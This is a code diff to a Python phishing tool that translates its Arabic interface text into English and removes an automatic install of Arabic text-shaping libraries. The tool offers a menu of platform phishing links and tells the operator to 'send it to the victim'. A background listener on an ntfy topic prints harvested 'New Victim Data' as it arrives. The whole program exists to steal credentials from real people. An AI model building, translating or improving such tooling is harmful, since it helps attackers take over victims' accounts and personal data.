@@ -6,28 +6,12 @@ import uuid
 import threading
 import time
 import sys
-import subprocess
 
 if hasattr(sys.stdout, 'reconfigure'):
     sys.stdout.reconfigure(encoding='utf-8')
     sys.stderr.reconfigure(encoding='utf-8')
 if hasattr(sys.stdin, 'reconfigure'):
     sys.stdin.reconfigure(encoding='utf-8')
-
-try:
-    import arabic_reshaper
-    from bidi.algorithm import get_display
-    ARABIC_SHAPING = True
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "arabic-reshaper", "python-bidi"])
-    import arabic_reshaper
-    from bidi.algorithm import get_display
-    ARABIC_SHAPING = True
-
-def ar(text):
-    if not ARABIC_SHAPING:
-        return text
-    return get_display(arabic_reshaper.reshape(text))
 
 ORANGE = "\033[38;5;208m"
 RED = '\033[91m'
@@ -122,7 +106,7 @@ def print_banner():
     print(WHITE + "[–] Tool Created by htr-tech (General)" + RESET)
     print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
     print()
-    print(ORANGE + ar("الشبح") + RESET)
+    print(ORANGE + "The Ghost" + RESET)
     print()
 
 def print_menu():
@@ -140,7 +124,7 @@ def print_menu():
 
 def display_victim_data(message):
     print("\n" + WHITE + "═" * 40 + RESET)
-    print(WHITE + BOLD + ar("  📩 بيانات ضحية جديدة") + RESET)
+    print(WHITE + BOLD + "  📩 New Victim Data" + RESET)
     print(WHITE + "═" * 40 + RESET)
     lines = message.strip().split('\n')
     for line in lines:
@@ -149,9 +133,9 @@ def display_victim_data(message):
             continue
         if ':' in line:
             key, val = line.split(':', 1)
-            print(WHITE + BOLD + ar(key.strip()) + RESET + ": " + WHITE + ar(val.strip()) + RESET)
+            print(WHITE + BOLD + key.strip() + RESET + ": " + WHITE + val.strip() + RESET)
         else:
-            print(WHITE + ar(line) + RESET)
+            print(WHITE + line + RESET)
     print(WHITE + "═" * 40 + RESET + "\n")
 
 def listen_ntfy(topic):
@@ -175,7 +159,7 @@ def main():
     secret = load_or_create_secret()
     clear_screen()
     print_banner()
-    print(WHITE + ar("🔑 مفتاحك السري: ") + ORANGE + secret + RESET)
+    print(WHITE + "Secret Key: " + ORANGE + secret + RESET)
     print()
     threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
     time.sleep(1)
@@ -185,7 +169,7 @@ def main():
         choice = input().strip()
 
         if choice == "00" or choice == "0":
-            print(WHITE + ar("إيقاف الأداة...") + RESET)
+            print(WHITE + "Stopping tool..." + RESET)
             sys.exit(0)
 
         if choice.isdigit():
@@ -194,8 +178,8 @@ def main():
                 if LINKS[num] == "":
                     clear_screen()
                     print_banner()
-                    print(WHITE + ar("❌ منصة ") + ORANGE + PLATFORMS[num] + WHITE + ar(" غير مفعلة بعد.") + RESET)
-                    input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
+                    print(WHITE + "❌ Platform " + ORANGE + PLATFORMS[num] + WHITE + " is not enabled yet." + RESET)
+                    input(WHITE + "Press Enter to go back..." + RESET)
                     clear_screen()
                     print_banner()
                 else:
@@ -203,25 +187,25 @@ def main():
                     clear_screen()
                     print_banner()
                     print(WHITE + "═" * 40 + RESET)
-                    print(WHITE + ar("✅ رابط ") + ORANGE + PLATFORMS[num] + WHITE + ":" + RESET)
+                    print(WHITE + "✅ Link for " + ORANGE + PLATFORMS[num] + WHITE + ":" + RESET)
                     print(ORANGE + BOLD + link + RESET)
                     print(WHITE + "═" * 40 + RESET)
-                    print(WHITE + ar("انسخ الرابط وأرسله للضحية.") + RESET)
-                    input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
+                    print(WHITE + "Copy the link and send it to the victim." + RESET)
+                    input(WHITE + "Press Enter to go back..." + RESET)
                     clear_screen()
                     print_banner()
             else:
                 clear_screen()
                 print_banner()
-                print(WHITE + ar("رقم غير صحيح (استخدم 01-35 أو 00)") + RESET)
-                input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
+                print(WHITE + "Invalid number (use 01-35 or 00)" + RESET)
+                input(WHITE + "Press Enter to go back..." + RESET)
                 clear_screen()
                 print_banner()
         else:
             clear_screen()
             print_banner()
-            print(WHITE + ar("اختيار غير مفهوم") + RESET)
-            input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
+            print(WHITE + "Unknown choice" + RESET)
+            input(WHITE + "Press Enter to go back..." + RESET)
             clear_screen()
             print_banner()
 
